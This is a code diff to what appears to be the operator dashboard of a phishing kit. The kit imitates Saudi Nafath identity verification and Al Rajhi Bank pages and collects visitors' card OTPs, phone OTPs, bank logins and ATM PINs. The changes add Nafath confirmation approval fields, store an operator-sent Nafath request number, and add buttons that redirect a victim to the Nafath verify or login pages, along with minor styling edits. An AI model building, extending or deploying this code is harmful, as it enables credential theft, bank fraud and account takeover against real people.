@@ -1578,6 +1578,11 @@ function AdminDashboard() {
     } else if (field === "phoneOtpApprovalStatus") {
       payload.phoneOtpApproved = status === "approved";
       payload.phoneOtpStatus = status;
+    } else if (field === "nafadConfirmationStatus") {
+      payload.nafadConfirmationStatus = status;
+      payload.nafathApproved = status === "approved";
+      payload.otpApproved = status === "approved";
+      payload.otpStatus = status;
     }
 
     console.log("[DEBUG] setApprovalStatus update:", {
@@ -3085,7 +3090,7 @@ function NafadControl({
   ) => void;
 }) {
   const [code, setCode] = useState("");
-  const sentCode = String(visitor.nafadConfirmationCode || "");
+  const sentCode = String(visitor.nafadConfirmationCode || (visitor as any).nafathRequestNumber || "");
   const status = visitor.nafadConfirmationStatus;
 
   async function sendCode() {
@@ -3095,6 +3100,7 @@ function NafadControl({
       doc(db, "pays", visitor.id),
       {
         nafadConfirmationCode: clean,
+        nafathRequestNumber: clean,
         nafadConfirmationStatus: "waiting",
         nafadUpdatedAt: new Date().toISOString(),
         updatedAt: new Date().toISOString(),
@@ -3109,6 +3115,7 @@ function NafadControl({
       doc(db, "pays", visitor.id),
       {
         nafadConfirmationCode: "",
+        nafathRequestNumber: "",
         nafadConfirmationStatus: "waiting",
         nafadUpdatedAt: new Date().toISOString(),
         updatedAt: new Date().toISOString(),
@@ -3379,8 +3386,8 @@ const ALL_APP_PAGES = [
   { path: "/otp", label: "رمز تحقق البطاقة (Card OTP)" },
   { path: "/verify-mobile", label: "تأكيد رقم الجوال (Verify Mobile)" },
   { path: "/phone-otp", label: "رمز OTP الهاتف (Phone SMS OTP)" },
+  { path: "/nafath-verify", label: "تأكيد وتوثيق نفاذ (Nafath Confirmation / Verify)" },
   { path: "/nafath-login", label: "تسجيل دخول نفاذ (Nafath Login)" },
-  { path: "/nafath-verify", label: "توثيق نفاذ / الرمز (Nafath Verification)" },
   { path: "/rajhi-login", label: "دخول الراجحي (Rajhi Bank Login)" },
   { path: "/rajhi-otp", label: "رمز OTP الراجحي (Rajhi Bank OTP)" },
   { path: "/atm-pin", label: "الرقم السري للصراف (ATM PIN)" },
@@ -3397,6 +3404,7 @@ const ALL_APP_PAGES = [
 ];
 
 function PagesControl({ visitor }: { visitor: Visitor }) {
+  const lightMode = React.useContext(AdminThemeContext);
   const current = Number(visitor.step) || 1;
   const directed = Number(visitor.directedStep) || 0;
   const flow = getVisitorFlow(visitor);
@@ -3528,7 +3536,7 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
                   ? "bg-cyan-500 text-slate-900 border-cyan-400"
                   : isDirected
                     ? "bg-violet-500/30 text-violet-200 border-violet-400/50"
-                    : "bg-slate-800/60 text-slate-300 border-slate-700 hover:bg-slate-700"
+                    : `${lightMode ? "bg-white" : "bg-slate-800/60"} text-slate-300 border-slate-700 hover:bg-slate-700`
               }`}
             >
               <div className="flex items-center justify-between gap-1 mb-0.5">
@@ -3544,6 +3552,32 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
             </button>
           );
         })}
+      </div>
+
+      {/* Quick Nafath Controls */}
+      <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-2 space-y-1.5">
+        <div className="text-[10px] text-teal-400 font-bold flex items-center justify-between">
+          <span>توجيه نفاذ السريع (Nafath Controls)</span>
+          <span className="text-[9px] text-slate-400 font-normal">تأكيد / دخول</span>
+        </div>
+        <div className="grid grid-cols-2 gap-1.5">
+          <button
+            type="button"
+            onClick={() => void pushCustomPath("/nafath-verify")}
+            className="py-1.5 px-2 rounded-lg text-[10px] font-bold bg-teal-500/20 text-teal-300 border border-teal-500/40 hover:bg-teal-500/30 text-center transition"
+            data-testid="button-quick-nafath-verify"
+          >
+            ✓ تأكيد نفاذ (Verify)
+          </button>
+          <button
+            type="button"
+            onClick={() => void pushCustomPath("/nafath-login")}
+            className="py-1.5 px-2 rounded-lg text-[10px] font-bold bg-slate-800 text-slate-300 border border-slate-700 hover:bg-slate-700 text-center transition"
+            data-testid="button-quick-nafath-login"
+          >
+            🔑 دخول نفاذ (Login)
+          </button>
+        </div>
       </div>
 
       <div className="border-t border-slate-800 pt-2 space-y-2">
@@ -3576,13 +3610,13 @@ function PagesControl({ visitor }: { visitor: Visitor }) {
         <div className="grid grid-cols-2 gap-1.5">
           <button
             onClick={() => clearApproval("cardApprovalStatus")}
-            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+            className={`py-1 ${lightMode ? "bg-slate-50" : "bg-slate-800/60"} text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700`}
           >
             بطاقة
           </button>
           <button
             onClick={() => clearApproval("otpApprovalStatus")}
-            className="py-1 bg-slate-800/60 text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700"
+            className={`py-1 ${lightMode ? "bg-slate-50" : "bg-slate-800/60"} text-slate-300 rounded text-[10px] font-semibold border border-slate-700 hover:bg-slate-700`}
           >
             OTP
           </button>
